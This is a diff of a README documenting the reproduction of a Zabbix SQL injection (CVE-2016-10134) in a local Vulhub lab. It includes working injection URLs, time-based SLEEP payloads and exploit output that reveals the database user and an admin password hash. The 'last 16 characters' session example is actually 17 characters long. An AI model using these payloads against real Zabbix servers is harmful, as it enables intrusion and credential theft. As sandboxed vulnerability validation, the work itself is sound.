@@ -1,168 +1,290 @@
 # Vuln2Action-Demo
 This repository contains the demo video for the exploit code to be tested in sandboxed environment.
 The testing has been done using the vulhub platform .
-SQl Injection from Vulhub
+# CVE-2016-10134 Validation using Vulhub
 
+## Overview
 
-Vulnerability ref - 
-https://github.com/vulhub/vulhub/tree/40271304330e5411de114ca578e2507023148358/zabbix/CVE-2016-10134
+This repository demonstrates the validation of **CVE-2016-10134**, a SQL Injection vulnerability affecting Zabbix.
 
+**Vulnerability Reference**
 
+* CVE: CVE-2016-10134
+* Affected Versions:
 
-CVE-2016-10134
-SQL injection vulnerability in Zabbix before 2.2.14 and 3.0 before 3.0.4 allows remote attackers to execute arbitrary SQL commands via the toggle_ids array parameter in latest.php.
+  * Zabbix before 2.2.14
+  * Zabbix 3.0 before 3.0.4
 
+### Description
 
+The vulnerability exists in the `toggle_ids[]` parameter of `latest.php`, allowing authenticated users to execute arbitrary SQL commands.
 
- Docker & Vulhub Setup
+Official Vulhub Environment:
 
+https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134
 
-Clone the repo : git clone --depth 1 https://github.com/vulhub/vulhub
-Download docker if not present
-Run docker with docker-compose file
+---
 
+# Environment Setup
 
- Exploit Validation
+## 1. Clone Vulhub
 
+```bash
+git clone --depth 1 https://github.com/vulhub/vulhub.git
+cd vulhub/zabbix/CVE-2016-10134
+```
 
-Update docker-compose (was outdated)
-Add platform: linux/amd64
-Server
-Agent
+## 2. Update Docker Configuration
 
+The original Docker configuration may require updates on newer systems.
 
+Add the following line to both the Zabbix Server and Zabbix Agent services in `docker-compose.yml`:
+
+```yaml
+platform: linux/amd64
+```
+
+## 3. Start Containers
+
+```bash
 docker compose up -d
-This should get the docker running by pulling the apis and DB for zabbix
+```
 
+This pulls and launches:
 
-Login to Zabbix
-Use “guest” as username
-Use blank password
-Fetch session id …. They probably use session id in auth for token based auth
+* MySQL database
+* Zabbix Server
+* Zabbix Agent
+* Web frontend
 
+Verify that the application is accessible at:
 
+```text
+http://localhost:8080
+```
 
-Use session ID for injection
-Session id ->fb41007b792256f5381a37a9883c2b5c
-Use last 16(as mentioned in repo):
-Command : 
-http://ip_address:8080/latest.php?output=ajax&sid=session_id&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
-Result: 
+---
 
+# Manual Exploit Validation
 
- 
-Remove setup
-Docker compose down -d
+## 1. Login
 
+Open:
 
+```text
+http://localhost:8080
+```
 
-    3. Exploit Code Testing
-Update docker-compose (was outdated)
-Add platform: linux/amd64
-Server
-Agent
+Use the default guest account:
 
+```text
+Username: guest
+Password: <blank>
+```
 
-    2 .  docker compose up -d
-This should get the docker running by pulling the apis and DB for zabbix
+## 2. Obtain Session ID
 
-    
- 3 .  Run the exploit script after setup runs on localhost:8080
-           CVE-2016-10134_modified.py
+After login, obtain the session identifier from browser cookies.
 
-	Command : python3 /exploits/CVE-2016-10134_modified.py --url http://localhost:8080 --all
+Example:
 
-This command is assuming that you store the CVE exploit file mentioned above in a folder named exploits after pulling the vulhub repo
+```text
+fb41007b792256f5381a37a9883c2b5c
+```
 
+The vulnerable endpoint expects the last 16 characters:
 
+```text
+5381a37a9883c2b5c
+```
 
-Result - 1 (unmodified)
+## 3. Trigger SQL Injection
 
-============================================================
-  SUMMARY
-============================================================
-  Zabbix Version: 3.0.3
-  Version Vulnerable: True
-  Sqli Confirmed: False
-============================================================
+Send the following request:
 
-The reason for no injection was that the target code path was never reached
-The cookie was found thus labelled it vulnerable as that was reusable in latest.php
-The toggle_open_state was not ‘1’ as model was not aware of this from either the description or the CAPEC flows
-Required as per readme:
+```text
+http://localhost:8080/latest.php?output=ajax&sid=<SID>&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
+```
 
-http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
+Example:
 
-Can add the toggle_open_state=’1’ and the sid in the params for the request
-Just having toggle_ids is not enough
+```text
+http://localhost:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&toggle_open_state=1&toggle_ids[]=updatexml(0,concat(0xa,user()),0)
+```
 
+### Expected Result
 
+The response returns a database error containing the current database user, confirming successful SQL injection.
 
+---
 
+# Automated Exploit Validation
 
-Result - 2 (Updated Payload)
-============================================================
-  DETECTION PHASE
-============================================================
-[*] Sending time-based payload: 1 AND SLEEP(3)-- -
-    Response time: 0.03s (threshold: 2.10s)
-[-] No delay detected — may not be vulnerable or not MySQL
-[*] Sending boolean-based payloads …
-    TRUE  response length: 7285
-    FALSE response length: 7285
-    Difference: 0 bytes
-[-] Responses identical — boolean detection inconclusive
+## 1. Start Environment
 
-[-] Vulnerability NOT confirmed by any method.
+```bash
+docker compose up -d
+```
 
-============================================================
-  SUMMARY
-============================================================
-  Zabbix Version: 3.0.3
-  Version Vulnerable: True
-  Sqli Confirmed: False
-============================================================
+## 2. Execute Exploit Script
 
-Did not work because detection checks ae incorrect maybe 
-No this was not the cause
-Or the inject SQL statement is not syntactically correct due to - - - line 
-Fixing the syntax for IN() clause in the sql query for injection 
-1 AND SLEEP(3)-- -   to IF(1=1,SLEEP(3),0)
+Store the exploit script as:
 
+```text
+exploits/CVE-2016-10134_modified.py
+```
 
+Run:
 
+```bash
+python3 exploits/CVE-2016-10134_modified.py --url http://localhost:8080 --all
+```
 
+---
 
-Result - 3 (Updated SQL Syntax)
-============================================================
-  DETECTION PHASE
-============================================================
-[*] jsrpc.php time-based payload: 1 AND SLEEP(3)-- -
-    Response time: 0.04s (threshold: 2.10s)
-[-] No delay via jsrpc.php
-[*] latest.php time-based payload: IF(1=1,SLEEP(3),0)
-    Response time: 3.04s (threshold: 2.10s)
-[+] TIME-BASED SQLi CONFIRMED (via latest.php)
+# Validation Results
 
+## Initial Attempt
 
-Final result 
-============================================================
-  SUMMARY
-============================================================
-  Zabbix Version: 3.0.3
-  Version Vulnerable: True
-  Sqli Confirmed: True
-  Db Version: 5.7.44
-  Db User: root@172.18.0.5
-  Db Name: zabbix
-  Admin Hash: 5fce1b3e34b520afeffb37ce08c7cd66   (MD5)
-  Users:
-    - admin
-    - guest
-============================================================
+Output:
 
+```text
+SUMMARY
 
+Zabbix Version: 3.0.3
+Version Vulnerable: True
+Sqli Confirmed: False
+```
 
+### Root Cause
 
- 
+Although the script identified a vulnerable version, the vulnerable code path was not reached because:
 
+* `toggle_open_state=1` was missing.
+* A valid `sid` parameter was not included.
+* The request never executed the vulnerable SQL query.
+
+The official exploit requires:
+
+```text
+latest.php?output=ajax
+&sid=<valid_sid>
+&favobj=toggle
+&toggle_open_state=1
+&toggle_ids[]=<payload>
+```
+
+---
+
+## Updated Payload Attempt
+
+Output:
+
+```text
+DETECTION PHASE
+
+Sending time-based payload:
+1 AND SLEEP(3)-- -
+
+Response time: 0.03s
+
+No delay detected
+
+Boolean payloads:
+TRUE length: 7285
+FALSE length: 7285
+
+Responses identical
+
+Vulnerability NOT confirmed
+```
+
+### Analysis
+
+The issue was not caused by the detection logic itself.
+
+The injected SQL payload was incompatible with the underlying query structure, preventing execution of the intended delay.
+
+---
+
+## Final Fix
+
+The payload was modified to match the SQL context more accurately:
+
+### Original
+
+```sql
+1 AND SLEEP(3)-- -
+```
+
+### Updated
+
+```sql
+IF(1=1,SLEEP(3),0)
+```
+
+---
+
+# Successful Validation
+
+Output:
+
+```text
+DETECTION PHASE
+
+jsrpc.php time-based payload:
+1 AND SLEEP(3)-- -
+
+Response time: 0.04s
+
+No delay via jsrpc.php
+
+latest.php time-based payload:
+IF(1=1,SLEEP(3),0)
+
+Response time: 3.04s
+
+TIME-BASED SQLi CONFIRMED
+```
+
+Final Summary:
+
+```text
+SUMMARY
+
+Zabbix Version: 3.0.3
+Version Vulnerable: True
+Sqli Confirmed: True
+
+Db Version: 5.7.44
+Db User: root@172.18.0.5
+Db Name: zabbix
+
+Admin Hash:
+5fce1b3e34b520afeffb37ce08c7cd66 (MD5)
+
+Users:
+- admin
+- guest
+```
+
+---
+
+# Cleanup
+
+Stop and remove the environment:
+
+```bash
+docker compose down
+```
+
+---
+
+# Key Findings
+
+* Vulnerability successfully reproduced in Vulhub.
+* Authentication via a valid session identifier is required.
+* `toggle_open_state=1` is mandatory to reach the vulnerable code path.
+* Generic SQLi payloads may fail due to query structure constraints.
+* A context-aware payload (`IF(1=1,SLEEP(3),0)`) successfully confirmed blind time-based SQL injection.
+* Database information and user data were successfully extracted after confirmation.
